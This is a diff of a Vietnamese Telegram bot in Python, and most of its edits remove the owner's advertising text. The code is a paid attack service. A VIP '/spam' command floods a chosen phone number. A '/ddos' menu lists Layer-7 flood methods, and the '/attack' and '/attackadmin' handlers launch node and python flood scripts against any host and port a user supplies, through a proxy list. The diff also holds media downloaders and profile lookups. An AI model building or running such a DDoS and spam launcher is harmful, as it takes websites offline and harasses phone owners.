 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -1210,7 +780,7 @@ def spam(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     global last_spam_time
 
     # Kiểm tra xem người gửi có phải là admin hoặc thành viên VIP không
@@ -1218,34 +788,34 @@ def spam(message):
     if user_id not in ADMIN_ID and member_types.get(user_id) != 'VIP':
         bot.reply_to(message, '⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @Vpsvanmanhgaming  để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /sms nếu bạn là người dùng miễn phí')
         return
-    
+
     # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     # Kiểm tra thời gian giữa hai lần sử dụng lệnh /spam
     current_time = time.time()
     if current_time - last_spam_time < 60:
         remaining_time = int(60 - (current_time - last_spam_time))
         bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /spamvip')
         return
-    
+
     if len(message.text.split()) != 3:
         bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /spamvip 0559140928 25')
         return
-    
+
     phone_number = message.text.split()[1]
     lap = message.text.split()[2]
-    
+
     if not lap.isnumeric() or not (0 < int(lap) <= 25):
         bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 25 lần ')
         return
-    
+
     if phone_number in banned_numbers:
         bot.reply_to(message, 'Số Điện Thoại Bị Cấm !')
         return
-    
+
     if len(phone_number) != 10 or not phone_number.isdigit():
         bot.reply_to(message, 'Số điện thoại không hợp lệ!')
         return
@@ -1262,18 +832,15 @@ def spam(message):
 ➤ Ngày : {TimeStamp()}
 ➤ Plan : ViP👑
 ➤ Chúc Bạn sử dụng bot vui vẻ⚡️
-➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
-➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
-➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n
+\n
 ━━━━━━━━━━━━━━━━━━━
 https://files.catbox.moe/4mvahe.mp4
 ━━━━━━━━━━━━━━━━━━━
     ''')
-    
+
     # Cập nhật thời gian sử dụng lệnh /spam lần cuối
     last_spam_time = current_time
 
-    
 
 
 @bot.message_handler(commands=['avtfb'])
@@ -1300,7 +867,7 @@ def get_facebook_avatar(message: Message):
 
     # Check the format of the command
     if len(message.text.split()) != 2:
-        bot.reply_to(message, 'Vui lòng nhập đúng định dạng !\nVí dụ: /avtfb [link hoặc id]\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
+        bot.reply_to(message, 'Vui lòng nhập đúng định dạng !\nVí dụ: /avtfb [link hoặc id]')
         return
 
     # Get the parameter from the message
@@ -1314,7 +881,7 @@ def get_facebook_avatar(message: Message):
 
     # Check if the link is from Facebook
     if 'facebook.com' not in facebook_url:
-        bot.reply_to(message, 'Liên kết không phải từ Facebook !\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
+        bot.reply_to(message, 'Liên kết không phải từ Facebook !')
         return
 
     try:
@@ -1332,18 +899,15 @@ def get_facebook_avatar(message: Message):
         if meta_image:
             avatar_url = meta_image['content']
             # Get request info
-            request_info = f"Ảnh từ Facebook được yêu cầu bởi: {message.from_user.first_name}\n(@{message.from_user.username}) trong nhóm {message.chat.title}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"
+            request_info = f"Ảnh từ Facebook được yêu cầu bởi: {message.from_user.first_name}\n(@{message.from_user.username}) trong nhóm {message.chat.title}"
             # Send photo back to user
             bot.send_photo(message.chat.id, avatar_url, caption=request_info)
         else:
-            bot.reply_to(message, 'Không tìm thấy Avatar trên Facebook !\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
+            bot.reply_to(message, 'Không tìm thấy Avatar trên Facebook !')
     except requests.exceptions.HTTPError as http_err:
-        bot.reply_to(message, f'Có lỗi HTTP xảy ra: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
+        bot.reply_to(message, f'Có lỗi HTTP xảy ra: {http_err}')
     except Exception as e:
-        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
-
-
-
+        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')
 
 @bot.message_handler(commands=['ddos'])
 def ddos(message):
@@ -1364,27 +928,27 @@ def ddos(message):
         return
 
     # Tin nhắn hướng dẫn
-    help_text = '''  
+    help_text = '''
 >> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 ⚡️
 ━━━━━━━━━━━━━━━━━━━
  • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗙𝗿𝗲𝗲
 ━━━━━━━━━━━━━━━━━━━
- • HTTPS-FREE [🆓] 
+ • HTTPS-FREE [🆓]
  • TCP-FREE [🆓]
 ━━━━━━━━━━━━━━━━━━━
  • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗩𝗶𝗽 🔴
 ━━━━━━━━━━━━━━━━━━━
- • BYPASS [Vip💲] 
- • SMURF [Vip💲] 
- • MIX [Vip ] 
- • GOD [Vip💲] 
- • UAM [Vip💲] 
- • HTTPS-VIP [Vip💲] 
- • TLS [Vip💲]  
+ • BYPASS [Vip💲]
+ • SMURF [Vip💲]
+ • MIX [Vip ]
+ • GOD [Vip💲]
+ • UAM [Vip💲]
+ • HTTPS-VIP [Vip💲]
+ • TLS [Vip💲]
  • BR [Vip💲]
- • FLOOD [Vip💲] 
- • FLOODER [Vip💲] 
- • MARS [Vip💲] 
+ • FLOOD [Vip💲]
+ • FLOODER [Vip💲]
+ • MARS [Vip💲]
  • ADMIN-VIP [Vip💲] [h2-tls] [Đang Bảo Trì]
  • ADMIN-THUONG [Vip💲] [h2-hyper] [Đang Bảo Trì]
  Ví Dụ✅ : /attack HTTPS-FREE httpsvpsvanmanhgaming.click 443 \n/attack + Method + Target_Url + Port
@@ -1393,10 +957,8 @@ https://files.catbox.moe/z5mar1.mp4
 ━━━━━━━━━━━━━━━━━━━
 '''
 
-
     # Gửi tin nhắn với video và tin nhắn hướng dẫn
     bot.send_message(message.chat.id, help_text)
-
 
 allowed_users = []  # Define your allowed users list
 cooldown_dict = {}
@@ -1405,22 +967,20 @@ is_bot_active = True
 def run_attack(command, duration, message):
     cmd_process = subprocess.Popen(command)
     start_time = time.time()
-    
+
     while cmd_process.poll() is None:
         # Check CPU usage and terminate if it's too high for 10 seconds
         if psutil.cpu_percent(interval=1) >= 1:
             time_passed = time.time() - start_time
             if time_passed >= 120:
                 cmd_process.terminate()
-                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng:> \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \n➤ VPS Giá Rẻ💳💲:httpsvpsvanmanhgaming.click\n\n")
+                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng:>")
                 return
         # Check if the attack duration has been reached
         if time.time() - start_time >= duration:
             cmd_process.terminate()
             cmd_process.wait()
             return
-
-
 
 # Define bot active state as a boolean
 is_bot_active = True  # Initially assuming bot is active
@@ -1455,7 +1015,7 @@ def perform_attack(message):
     # Cooldown check
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
         remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack")
         return
 
     args = message.text.split()
@@ -1505,13 +1065,13 @@ def perform_attack(message):
             duration = 200
         elif method == 'HTTPS-VIP':
             command = ["node", "HTTPS.js", host, "200", "35", "25", "proxy.txt", "bypass"]
-            duration = 200 
+            duration = 200
         elif method == 'MIX':
             command = ["node", "vip.js", host, "200", "35", "25", "proxy.txt"]
             duration = 200
         elif method == 'TCP-FREE':
             command = ["node", "TCP.js", host, "60", "35", "25", "proxy.txt"]
-            duration = 60   
+            duration = 60
         elif method == 'GOD':
             command = ["node", "GOD.js", host, "200", "35", "15", "proxy.txt"]
             duration = 200
@@ -1552,18 +1112,11 @@ def perform_attack(message):
             f'↣ Check_Host 🔗: [ {check_host_url} ] \n'
             f'↣ 𝗕𝗼𝘁 🤖: @VPSVANMANHGAMINGBOT \n'
             f'↣ 𝗢𝘄𝗻𝗲𝗿 👑 : ➤ @Vpsvanmanhgaming💳💲 \n'
-            f'↣ VPS Giá Rẻ 💳💲: httpsvpsvanmanhgaming.click \n\n'
+            f'\n'
         )
         bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')
     else:
-        bot.reply_to(message, '⚠️ Bạn đã nhập sai lệnh. Hãy sử dụng lệnh /ddos để xem phương thức tấn công!\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
-
-
-
-
-
-
-
+        bot.reply_to(message, '⚠️ Bạn đã nhập sai lệnh. Hãy sử dụng lệnh /ddos để xem phương thức tấn công!')
 
 @bot.message_handler(commands=['ddosadmin'])
 def ddos(message):
@@ -1585,12 +1138,12 @@ def ddos(message):
 
     # Kiểm tra quyền admin
     if user_id not in ADMIN_DDOS:
-        if user_id not in ADMIN_DDOS:   
-            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        if user_id not in ADMIN_DDOS:
+            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!')
             return
 
     # Tin nhắn hướng dẫn
-    help_text = '''  
+    help_text = '''
 >> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 🛡️⚡️
 ━━━━━━━━━━━━━━━━━━━
  • 𝗟𝗮𝘆𝗲𝗿𝟳 Admin 🛡️🔴
@@ -1604,13 +1157,6 @@ https://files.catbox.moe/32wmdq.mp4
 '''
     # Gửi tin nhắn với video và tin nhắn hướng dẫn
     bot.send_message(message.chat.id, help_text)
-
-
-
-
-
-
-
 
 @bot.message_handler(commands=['attackadmin'])
 def perform_attack(message):
@@ -1635,14 +1181,14 @@ def perform_attack(message):
 
     # Kiểm tra quyền admin
     if user_id not in ADMIN_DDOS:
-        if user_id not in ADMIN_DDOS:   
-            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        if user_id not in ADMIN_DDOS:
+            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!')
             return
 
     # Kiểm tra thời gian cooldown
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
         remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attackadmin\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n Shop 4G 💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attackadmin")
         return
 
     args = message.text.split()
@@ -1658,7 +1204,7 @@ def perform_attack(message):
     if is_blocked_domain(host):
         bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {host}")
         return
-    
+
     if method == 'ADMIN-THUONG':
         command = ["python", "ddosvip.py", host, "60", "tls"]
         duration = 60
@@ -1689,14 +1235,10 @@ def perform_attack(message):
         f'↣ 𝗣𝗹𝗮𝗻 💵: [ ADMIN ]\n'
         f'↣ Check_Host 🔗: [ {check_host_url} ]\n'
         f'↣ 𝗕𝗼𝘁 🤖: @VPSVANMANHGAMINGBOT\n'
-        f'↣ 𝗢𝘄𝗻𝗲𝗿 👑: @Vpsvanmanhgaming💳💲\n'
-        f'↣ Shop4G 💳💲: https://4gvpsvanmanhgaming.click\n'
-        f'↣ VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n'
+        f'↣ \n'
+        f'↣ \n'
     )
     bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='HTML')
-
-
-
 
 @bot.message_handler(commands=['donate'])
 def donate(message):
@@ -1710,7 +1252,7 @@ def donate(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-        
+
     reply_text = """
 >> 𝗧𝗛𝗢̂𝗡𝗚 𝗧𝗜𝗡 𝗗𝗢𝗡𝗔𝗧𝗘 💵
 ➤ Ngân Hàng : TP BANK
@@ -1718,9 +1260,7 @@ def donate(message):
 ➤ Chủ Tài Khoản : NGUYEN VAN TAM
 ➤ Nội Dung : ADMIN 1 Đẹp Zai Nhất Admin 1
 ➤ Số Tiền : 1000.000.000vnđ
-➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
-➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
-➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click
+
 ⚠️ Lưu Ý Nếu Ít Thì 500.000.000VNĐ
 Nhiều Thì 50.000.000VNĐ Nghe Chưa
 Chúng Mày Hiểu Anh Nói Gì Không🌚
@@ -1729,8 +1269,6 @@ https://files.catbox.moe/mqi836.mp4
 ━━━━━━━━━━━━━━━━━━━
 """
     bot.reply_to(message, reply_text)
-
-
 
 @bot.message_handler(commands=['fb'])
 def fb(message):
@@ -1780,8 +1318,6 @@ def fb(message):
     except Exception as e:
         print(f"Không thể xóa tin nhắn: {e}")
 
-
-
 # Function to handle /ytb command
 @bot.message_handler(commands=['ytb'])
 def search_youtube(message: Message):
@@ -1801,13 +1337,13 @@ def search_youtube(message: Message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     # Get the search keyword from the message
     keyword = message.text.replace("/ytb", "").strip()
 
     # Check if a search keyword is provided
     if not keyword:
-        bot.reply_to(message, "Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, "Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP")
         return
 
     try:
@@ -1817,37 +1353,32 @@ def search_youtube(message: Message):
 
         # Check if there are search results
         if not results['result']:
-            bot.reply_to(message, f"Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP\n'{keyword}'\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+            bot.reply_to(message, f"Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP\n'{keyword}'")
             return
-        
+
         # Prepare list of video links and format the message
         video_links = []
         for video in results['result']:
             title = video['title']
             link = f"https://www.youtube.com/watch?v={video['id']}"
-            video_links.append(f"🎬 {title}\n🔗 {link}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+            video_links.append(f"🎬 {title}\n🔗 {link}")
 
         # Send the list of video links to the user
         reply_message = "\n\n".join(video_links)
         bot.reply_to(message, reply_message)
 
     except Exception as e:
-        bot.reply_to(message, f"Có lỗi xảy ra khi tìm kiếm video: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, f"Có lỗi xảy ra khi tìm kiếm video: {str(e)}")
 
-
-
-
-
-
-@bot.message_handler(commands=['capcut']) 
-def handle_capcut(message): 
+@bot.message_handler(commands=['capcut'])
+def handle_capcut(message):
 
     user_id = message.from_user.id
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -1857,32 +1388,29 @@ def handle_capcut(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
-    try: 
-        url = message.text.split()[1]  # Lấy URL từ lệnh capcut 
-        api_url = f"https://api.sumiproject.net/capcutdowload?url={url}" 
-        response = requests.get(api_url) 
- 
-        if response.status_code == 200: 
-            data = response.json() 
-            title = data.get("title", "N/A") 
-            description = data.get("description", "N/A") 
-            usage = data.get("usage", "N/A") 
-            video_url = data.get("video") 
-            if video_url: 
-                bot.send_message(message.chat.id, f"Mô Tả: {title}\nDescription: {description}\nLượt dùng: {usage}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
-                bot.send_video(message.chat.id, video_url) 
-            else: 
-                bot.reply_to(message, "Không tìm thấy URL video trong dữ liệu API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
-        else: 
-            bot.reply_to(message, "Không thể kết nối đến API. Vui lòng thử lại sau.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
- 
-    except IndexError: 
-        bot.reply_to(message, "Vui lòng cung cấp URL sau lệnh capcut.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
 
+    try:
+        url = message.text.split()[1]  # Lấy URL từ lệnh capcut
+        api_url = f"https://api.sumiproject.net/capcutdowload?url={url}"
+        response = requests.get(api_url)
 
+        if response.status_code == 200:
+            data = response.json()
+            title = data.get("title", "N/A")
+            description = data.get("description", "N/A")
+            usage = data.get("usage", "N/A")
+            video_url = data.get("video")
+            if video_url:
+                bot.send_message(message.chat.id, f"Mô Tả: {title}\nDescription: {description}\nLượt dùng: {usage}")
 
+                bot.send_video(message.chat.id, video_url)
+            else:
+                bot.reply_to(message, "Không tìm thấy URL video trong dữ liệu API.")
+        else:
+            bot.reply_to(message, "Không thể kết nối đến API. Vui lòng thử lại sau.")
 
+    except IndexError:
+        bot.reply_to(message, "Vui lòng cung cấp URL sau lệnh capcut.")
 
 @bot.message_handler(commands=['tiktok'])
 def luuvideo_tiktok(message):
@@ -1892,7 +1420,7 @@ def luuvideo_tiktok(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -1906,7 +1434,7 @@ def luuvideo_tiktok(message):
     if len(message.text.split()) == 1:
         sent_message = bot.reply_to(message, 'Vui lòng nhập đúng lệnh /tiktok <links video>')
         return
-    
+
     linktt = message.text.split()[1]
     data = f'url={linktt}'
     head = {
@@ -1915,23 +1443,20 @@ def luuvideo_tiktok(message):
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
     }
-    
+
     response = requests.post("https://www.tikwm.com/api/", data=data, headers=head).json()
     linkz = response['data']['play']
     rq = response['data']
     tieude = rq['title']
     view = rq['play_count']
-    
-    sent_message = bot.reply_to(message, f'C̶E̶0̶ V̶i̶d̶e̶o̶ D̶o̶w̶n̶l̶o̶a̶d̶ I̶n̶ P̶r̶o̶g̶r̶e̶s̶s̶...😴\n𝙳𝚎𝚜𝚌𝚛𝚒𝚋𝚎: {tieude}\n𝚅𝚒𝚎𝚠𝚜: {view}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
-    
+
+    sent_message = bot.reply_to(message, f'C̶E̶0̶ V̶i̶d̶e̶o̶ D̶o̶w̶n̶l̶o̶a̶d̶ I̶n̶ P̶r̶o̶g̶r̶e̶s̶s̶...😴\n𝙳𝚎𝚜𝚌𝚛𝚒𝚋𝚎: {tieude}\n𝚅𝚒𝚎𝚠𝚜: {view}\n ')
+
     try:
         bot.send_video(message.chat.id, video=linkz, caption=f'>>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n\n   • 𝙳𝚎𝚜𝚌𝚛𝚒𝚋𝚎: {tieude}\n   • 𝚅𝚒𝚎𝚠𝚜: {view}  ', reply_to_message_id=message.message_id, supports_streaming=True)
     except Exception as e:
-        bot.reply_to(message, f"⚠️ Video quá lớn, tôi không thể giúp bạn, vui lòng thử lại! {linkz}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, f"⚠️ Video quá lớn, tôi không thể giúp bạn, vui lòng thử lại! {linkz}")
         bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)
-
-
-
 
 @bot.message_handler(commands=['infoytb'])
 def check_ifytb(message):
@@ -1941,7 +1466,7 @@ def check_ifytb(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -1952,9 +1477,8 @@ def check_ifytb(message):
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
 
-
     if len(message.text.split()) == 1:
-        bot.reply_to(message, "Sử dụng /infoytb {link người dùng youtube}➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, "Sử dụng /infoytb {link người dùng youtube}\n ")
         return
     url = message.text.split()[1]
     rq = requests.get(f"https://scaninfo.net/?id={url}").json()
@@ -1977,11 +1501,8 @@ def check_ifytb(message):
         socmtvideodau = rq["latest_videos"][0]["commentCount"]
         viewvideodau = rq["latest_videos"][0]["viewCount"]
         playlist = len(rq["playlists"])
-        text = f"+ Link channel: {linkchannel}\n+ User name: {username}\n+ Name: {name}\n+ {thamgiatu}\n+ Số video: {videos}\n+ Số view: {views}\n+ Số đăng ký: {subcribes}\n+ Quốc gia: {quocgia}\n+ Mô tả: {mota}\n+ Video xuất hiện đầu: {videodau}\n- Tiêu đề: {tieude}\n- Số like: {solikevideodau}\n- Số Dislike: {sodislikevideodau}\n- Số comments: {socmtvideodau}\n- Số view: {viewvideodau}\n+ Playlist: Có {playlist}➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"
+        text = f"+ Link channel: {linkchannel}\n+ User name: {username}\n+ Name: {name}\n+ {thamgiatu}\n+ Số video: {videos}\n+ Số view: {views}\n+ Số đăng ký: {subcribes}\n+ Quốc gia: {quocgia}\n+ Mô tả: {mota}\n+ Video xuất hiện đầu: {videodau}\n- Tiêu đề: {tieude}\n- Số like: {solikevideodau}\n- Số Dislike: {sodislikevideodau}\n- Số comments: {socmtvideodau}\n- Số view: {viewvideodau}\n+ Playlist: Có {playlist}\n "
         bot.reply_to(message, text)
-
-
-
 
 # Hàm lấy thông tin tài khoản TikTok
 def lay_thong_tin_tai_khoan(api_url, user_id):
@@ -2025,7 +1546,7 @@ def handle_tiktok(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2037,12 +1558,14 @@ def handle_tiktok(message):
         return
 
     if len(message.text.split()) == 1:
-        sent_message = bot.reply_to(message, 'Vui lòng nhập đúng lệnh /tiktokid <id Tài Khoản Tiktok>\nVí Dụ:/tiktokid @kecodon7103>>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
